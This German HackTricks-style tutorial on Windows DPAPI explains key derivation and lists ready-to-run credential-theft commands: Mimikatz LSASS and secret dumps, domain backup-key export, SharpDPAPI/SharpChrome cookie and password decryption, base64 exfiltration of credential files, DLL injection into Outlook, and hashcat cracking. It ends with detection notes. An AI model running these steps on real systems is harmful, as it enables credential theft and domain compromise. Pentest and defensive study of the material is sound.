# DPAPI - Passwörter extrahieren

{{#include ../../banners/hacktricks-training.md}}



## Was ist DPAPI

Die Data Protection API (DPAPI) wird primär im Windows-Betriebssystem zur **symmetrischen Verschlüsselung asymmetrischer privater Schlüssel** verwendet und nutzt dabei entweder Benutzer- oder Systemgeheimnisse als bedeutende Entropiequelle. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, indem er ihnen ermöglicht, Daten mit einem Schlüssel zu verschlüsseln, der aus den Anmeldegeheimnissen des Benutzers abgeleitet ist oder — bei Systemverschlüsselung — aus den Domänen-Authentifizierungsgeheimnissen des Systems, sodass Entwickler den Schutz des Verschlüsselungsschlüssels nicht selbst verwalten müssen.

Die gebräuchlichste Verwendung von DPAPI erfolgt über die Funktionen **`CryptProtectData` und `CryptUnprotectData`**, die Anwendungen erlauben, Daten sicher mit der Sitzung des aktuell angemeldeten Prozesses zu verschlüsseln und zu entschlüsseln. Das bedeutet, dass die verschlüsselten Daten nur vom selben Benutzer oder System entschlüsselt werden können, das sie verschlüsselt hat.

Außerdem akzeptieren diese Funktionen auch einen **`entropy` parameter**, der während der Verschlüsselung und Entschlüsselung verwendet wird. Um etwas zu entschlüsseln, das unter Verwendung dieses Parameters verschlüsselt wurde, müssen Sie daher denselben Entropiewert bereitstellen, der bei der Verschlüsselung verwendet wurde.

### Erzeugung des Benutzer-Schlüssels

Die DPAPI erzeugt für jeden Benutzer einen eindeutigen Schlüssel (genannt **`pre-key`**) basierend auf dessen Anmeldeinformationen. Dieser Schlüssel wird aus dem Passwort des Benutzers und weiteren Faktoren abgeleitet; der Algorithmus hängt vom Benutzertyp ab, führt aber letztlich auf SHA1 hinaus. Beispielsweise hängt er für Domänenbenutzer **vom NTLM-Hash des Benutzers** ab.

Das ist besonders interessant, denn wenn ein Angreifer den Passwort-Hash des Benutzers erlangen kann, kann er:

- **Alle Daten entschlüsseln, die mit DPAPI verschlüsselt wurden** mit dem Schlüssel dieses Benutzers, ohne eine API kontaktieren zu müssen
- **Das Passwort offline knacken**, um den gültigen DPAPI-Schlüssel zu erzeugen

Außerdem wird jedes Mal, wenn ein Benutzer Daten mit DPAPI verschlüsselt, ein neuer **Master-Schlüssel** erzeugt. Dieser Master-Schlüssel ist derjenige, der tatsächlich zur Verschlüsselung der Daten verwendet wird. Jeder Master-Schlüssel erhält eine **GUID** (Globally Unique Identifier), die ihn identifiziert.

Die Master-Schlüssel werden im Verzeichnis **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gespeichert, wobei `{SID}` die Security Identifier dieses Benutzers ist. Der Master-Schlüssel wird durch den **`pre-key`** des Benutzers und außerdem durch einen **domain backup key** zur Wiederherstellung verschlüsselt (der gleiche Schlüssel wird also zweimal mit zwei unterschiedlichen Schlüsseln verschlüsselt).

Beachte, dass der **domain key, der zum Verschlüsseln des Master-Schlüssels verwendet wird, auf den Domänen-Controllern liegt und sich nie ändert**. Wenn ein Angreifer also Zugriff auf den Domänen-Controller hat, kann er den Domain-Backup-Key abrufen und die Master-Schlüssel aller Benutzer in der Domäne entschlüsseln.

Die verschlüsselten Blobs enthalten die **GUID des Master-Schlüssels**, der zur Verschlüsselung der Daten verwendet wurde, in ihren Headern.

> [!TIP]
> DPAPI-verschlüsselte Blobs beginnen mit **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
So sieht eine Sammlung von Master Keys eines Benutzers aus:

![](<../../images/image (1121).png>)

### Machine/System-Schlüsselerzeugung

Dies ist der Schlüssel, den die Maschine zur Verschlüsselung von Daten verwendet. Er basiert auf dem **DPAPI_SYSTEM LSA secret**, einem speziellen Schlüssel, auf den nur der SYSTEM-Benutzer zugreifen kann. Dieser Schlüssel wird verwendet, um Daten zu verschlüsseln, die vom System selbst zugänglich sein müssen, wie z. B. maschinenbezogene Anmeldeinformationen oder systemweite Geheimnisse.

Beachte, dass diese Schlüssel **kein Domain-Backup haben**, daher sind sie nur lokal zugänglich:

- **Mimikatz** kann darauf zugreifen, indem es die LSA secrets dumpet mit dem Befehl: `mimikatz lsadump::secrets`
- Das Secret wird in der Registry gespeichert, daher könnte ein Administrator die **DACL-Berechtigungen ändern, um darauf zuzugreifen**. Der Registrypfad ist: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Eine Offline-Extraktion aus Registry hives ist ebenfalls möglich. Zum Beispiel: als Administrator auf dem Ziel die hives speichern und sie exfiltrieren:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Stelle dann auf deiner Analyse-Box das DPAPI_SYSTEM LSA secret aus den hives wieder her und verwende es, um machine-scope blobs zu entschlüsseln (scheduled task passwords, service credentials, Wi‑Fi profiles, etc.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Geschützte Daten durch DPAPI

Zu den durch DPAPI geschützten personenbezogenen Daten gehören:

- Windows creds
- Passwörter und Auto-Vervollständigungsdaten von Internet Explorer und Google Chrome
- E-Mail- und interne FTP-Konto-Passwörter für Anwendungen wie Outlook und Windows Mail
- Passwörter für freigegebene Ordner, Ressourcen, drahtlose Netzwerke und Windows Vault, einschließlich Verschlüsselungsschlüsseln
- Passwörter für Remote-Desktop-Verbindungen, .NET Passport und private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
- Netzwerkpasswörter, die vom Credential Manager verwaltet werden, und persönliche Daten in Anwendungen, die CryptProtectData verwenden, wie Skype, MSN messenger und mehr
- Verschlüsselte Blobs in der Registry
- ...

Vom System geschützte Daten umfassen:
- WLAN-Passwörter
- Passwörter geplanter Aufgaben
- ...

### Optionen zur Extraktion des Master-Schlüssels

- Wenn der Benutzer Domänen-Administratorrechte hat, kann er auf den **Domain-Backup-Schlüssel** zugreifen, um alle Benutzer-Master-Schlüssel in der Domäne zu entschlüsseln:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Mit lokalen Administratorrechten ist es möglich, **auf den LSASS-Speicher zuzugreifen**, um die DPAPI master keys aller angemeldeten Benutzer und den SYSTEM key zu extrahieren.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Wenn der Benutzer lokale Administratorrechte hat, kann er auf das **DPAPI_SYSTEM LSA secret** zugreifen, um die machine master keys zu entschlüsseln:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, können Sie **die Master-Keys des Benutzers direkt entschlüsseln**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Wenn du in einer Session als user bist, ist es möglich, den DC **nach dem backup key zu fragen, um die master keys mittels RPC zu entschlüsseln**. Wenn du local admin bist und der user angemeldet ist, könntest du dafür **seinen session token stehlen**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault auflisten
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Zugriff auf DPAPI-verschlüsselte Daten

### DPAPI-verschlüsselte Daten finden

Bei normalen Benutzern befinden sich **geschützte Dateien** in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Prüfe auch, ob du in den obigen Pfaden `\Roaming\` durch `\Local\` ersetzen musst.

Beispiele zur Enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kann DPAPI-verschlüsselte Blobs im Dateisystem, in der Registry und in B64 blobs finden:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Beachte, dass [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aus demselben Repo) verwendet werden kann, um mit DPAPI sensible Daten wie cookies zu entschlüsseln.

#### Chromium/Edge/Electron schnelle Rezepte (SharpChrome)

- Aktueller Benutzer, interaktive Entschlüsselung gespeicherter Logins/cookies (funktioniert sogar mit Chrome 127+ app-bound cookies, weil der zusätzliche Schlüssel aus dem Benutzer’s Credential Manager aufgelöst wird, wenn im Benutzerkontext ausgeführt):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline-Analyse, wenn Sie nur Dateien haben. Extrahieren Sie zuerst den AES state key aus dem Profil "Local State" und verwenden Sie ihn dann, um die Cookie-DB zu entschlüsseln:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domänenweite/Remote-Triage, wenn Sie den DPAPI domain backup key (PVK) und Administratorrechte auf dem Zielhost haben:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Wenn du den DPAPI prekey/credkey eines Benutzers (aus LSASS) hast, kannst du password cracking überspringen und Profildaten direkt entschlüsseln:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Hinweise
- Neuere Chrome/Edge-Builds können bestimmte Cookies mit "App-Bound"-Verschlüsselung speichern. Die Offline-Entschlüsselung dieser speziellen Cookies ist ohne den zusätzlichen app-bound key nicht möglich; führen Sie SharpChrome im Kontext des Zielbenutzers aus, um ihn automatisch abzurufen. Siehe den unten referenzierten Chrome-Sicherheits-Blogpost.

### Zugriffsschlüssel und Daten

- **Verwenden Sie SharpDPAPI**, um Anmeldeinformationen aus DPAPI-verschlüsselten Dateien der aktuellen Sitzung zu erhalten:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Erhalte credentials-Informationen** wie die encrypted data und die guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Entschlüssele einen masterkey eines Benutzers, der den **domain backup key** mithilfe von RPC anfordert:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Das **SharpDPAPI**-Tool unterstützt außerdem diese Argumente zur Masterkey-Entschlüsselung (beachte, dass man mit `/rpc` den Domänen-Backup-Schlüssel abrufen kann, mit `/password` ein Klartext-Passwort verwenden kann oder mit `/pvk` eine DPAPI-Domänen-Private-Key-Datei angeben kann...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Daten mit einem masterkey entschlüsseln**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Das Tool **SharpDPAPI** unterstützt außerdem diese Argumente für die Entschlüsselung von `credentials|vaults|rdg|keepass|triage|blob|ps` (beachte, dass es möglich ist, `/rpc` zu verwenden, um den Backup-Schlüssel der Domäne zu erhalten, `/password`, um ein Klartext-Passwort zu verwenden, `/pvk`, um eine DPAPI-Domain-Private-Key-Datei anzugeben, `/unprotect`, um die Sitzung des aktuellen Benutzers zu verwenden...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Direktes Verwenden eines DPAPI prekey/credkey (kein Passwort erforderlich)

Wenn du LSASS dumpen kannst, offenbart Mimikatz oft einen per-logon DPAPI key, mit dem die masterkeys des Benutzers ohne Kenntnis des plaintext password entschlüsselt werden können. Gib diesen Wert direkt an das tooling weiter:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Einige Daten mit der **aktuellen Benutzersitzung** entschlüsseln:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline-Entschlüsselung mit Impacket dpapi.py

Wenn Sie die victim user’s SID und password (oder NT hash) haben, können Sie DPAPI masterkeys und Credential Manager blobs vollständig offline mit Impacket’s dpapi.py entschlüsseln.

- Artefakte auf der Festplatte identifizieren:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Passender masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Wenn File-Transfer-Tools unzuverlässig sind, base64 die Dateien auf dem Host und kopiere die Ausgabe:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Entschlüssele den masterkey mit der SID des Benutzers und dem Passwort/Hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Verwende den entschlüsselten masterkey, um das credential blob zu entschlüsseln:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Dieser Ablauf stellt häufig Domain-Anmeldeinformationen wieder her, die von Apps gespeichert wurden, die den Windows Credential Manager verwenden, einschließlich administrativer Konten (z. B. `*_adm`).

---

### Umgang mit optionaler Entropie ("Third-party entropy")

Einige Anwendungen übergeben einen zusätzlichen **entropy**-Wert an `CryptProtectData`. Ohne diesen Wert kann der Blob nicht entschlüsselt werden, selbst wenn der korrekte masterkey bekannt ist. Daher ist das Beschaffen der Entropie unerlässlich, wenn Anmeldeinformationen geschützt auf diese Weise angegriffen werden sollen (z. B. Microsoft Outlook, einige VPN-Clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ist eine user-mode DLL, die die DPAPI-Funktionen im Zielprozess hookt und transparent jede bereitgestellte optionale Entropie aufzeichnet. Das Ausführen von EntropyCapture im **DLL-injection**-Modus gegen Prozesse wie `outlook.exe` oder `vpnclient.exe` erzeugt eine Datei, die jeden Entropiepuffer dem aufrufenden Prozess und dem Blob zuordnet. Die erfasste Entropie kann später an **SharpDPAPI** (`/entropy:`) oder **Mimikatz** (`/entropy:<file>`) übergeben werden, um die Daten zu entschlüsseln.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft führte ab Windows 10 v1607 (2016) ein **context 3** masterkey-Format ein. `hashcat` v6.2.6 (Dezember 2023) fügte die hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) und **22102** (context 3) hinzu, die GPU-beschleunigtes Cracking von Benutzerpasswörtern direkt aus der masterkey-Datei ermöglichen. Angreifer können daher word-list- oder brute-force-Angriffe durchführen, ohne mit dem Zielsystem zu interagieren.

`DPAPISnoop` (2024) automatisiert den Prozess:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Das Tool kann außerdem Credential- und Vault-Blobs parsen, sie mit cracked keys entschlüsseln und cleartext passwords exportieren.

### Zugriff auf Daten anderer Maschinen

Bei **SharpDPAPI und SharpChrome** kannst du die Option **`/server:HOST`** angeben, um auf die Daten einer Remote-Maschine zuzugreifen. Natürlich musst du auf diese Maschine zugreifen können, und im folgenden Beispiel wird angenommen, dass der **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Andere Tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis und die Extraktion des Domain Controller Backup Key über RPC automatisiert. Das Skript löst anschließend die IP-Adressen aller Computer auf und führt einen smbclient auf allen Rechnern aus, um alle DPAPI-Blobs aller Benutzer abzurufen und alles mit dem Domain-Backup-Key zu entschlüsseln.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Mit der aus LDAP extrahierten Computerliste kann man jedes Subnetz finden, selbst wenn man es vorher nicht kannte!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann automatisch Geheimnisse dumpen, die durch DPAPI geschützt sind. Die 2.x-Version brachte folgende Neuerungen:

* Parallele Sammlung von Blobs von Hunderten Hosts
* Parsen von **context 3** masterkeys und automatische Hashcat-Cracking-Integration
* Unterstützung für Chrome "App-Bound" verschlüsselte Cookies (siehe nächsten Abschnitt)
* Ein neuer **`--snapshot`**-Modus, um Endpunkte wiederholt abzufragen und neu erstellte Blobs zu differenzieren

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für masterkey/credential/vault-Dateien, der Hashcat/JtR-Formate ausgeben und optional das Cracking automatisch starten kann. Er unterstützt vollständig Machine- und User-Masterkey-Formate bis Windows 11 24H1.

## Häufige Erkennungen

- Zugriff auf Dateien in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` und anderen DPAPI-bezogenen Verzeichnissen.
- Insbesondere von einem Netzwerk-Share wie **C$** oder **ADMIN$**.
- Einsatz von **Mimikatz**, **SharpDPAPI** oder ähnlichen Tools, um auf den LSASS-Speicher zuzugreifen oder Masterkeys zu dumpen.
- Ereignis **4662**: *An operation was performed on an object* – kann mit dem Zugriff auf das **`BCKUPKEY`**-Objekt korreliert werden.
- Ereignis **4673/4674**, wenn ein Prozess *SeTrustedCredManAccessPrivilege* anfordert (Credential Manager)

---
### 2023-2025 Schwachstellen & Änderungen im Ökosystem

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ein Angreifer mit Netzwerkzugang konnte ein Domänenmitglied dazu verleiten, einen bösartigen DPAPI-Backup-Schlüssel abzurufen, was die Entschlüsselung von Benutzer-Masterkeys erlaubte. Behoben im kumulativen Update vom November 2023 – Administratoren sollten sicherstellen, dass DCs und Workstations vollständig gepatcht sind.
* **Chrome 127 “App-Bound” cookie encryption** (Juli 2024) ersetzte den Legacy-DPAPI-only-Schutz durch einen zusätzlichen Schlüssel, der im Benutzer-**Credential Manager** gespeichert wird. Die Offline-Entschlüsselung von Cookies erfordert nun sowohl den DPAPI-Masterkey als auch den **GCM-wrapped app-bound key**. SharpChrome v2.3 und DonPAPI 2.x sind in der Lage, den zusätzlichen Schlüssel wiederherzustellen, wenn sie im Benutzerkontext ausgeführt werden.

### Fallstudie: Zscaler Client Connector – Angepasste Entropie, abgeleitet von SID

Zscaler Client Connector speichert mehrere Konfigurationsdateien unter `C:\ProgramData\Zscaler` (z. B. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Jede Datei ist mit **DPAPI (Machine scope)** verschlüsselt, aber der Anbieter liefert **custom entropy**, die *zur Laufzeit berechnet* wird, anstatt auf der Festplatte gespeichert zu werden.

Die Entropie wird aus zwei Elementen rekonstruiert:

1. Ein hart kodiertes Geheimnis, eingebettet in `ZSACredentialProvider.dll`.
2. Die **SID** des Windows-Kontos, dem die Konfiguration gehört.

Der vom DLL implementierte Algorithmus ist äquivalent zu:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Da das Geheimnis in einer DLL eingebettet ist, die von der Festplatte gelesen werden kann, **kann jeder lokale Angreifer mit SYSTEM-Rechten die Entropie für jede SID regenerieren** und die Blobs offline entschlüsseln:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Die Entschlüsselung liefert die vollständige JSON-Konfiguration, einschließlich jeder **device posture check** und ihres erwarteten Werts – Informationen, die bei clientseitigen Umgehungsversuchen sehr wertvoll sind.

> TIPP: Die anderen verschlüsselten Artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sind mit DPAPI **ohne** Entropie (`16` Null-Bytes) geschützt. Sie können daher direkt mit `ProtectedData.Unprotect` entschlüsselt werden, sobald SYSTEM-Rechte erlangt wurden.

## Referenzen

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
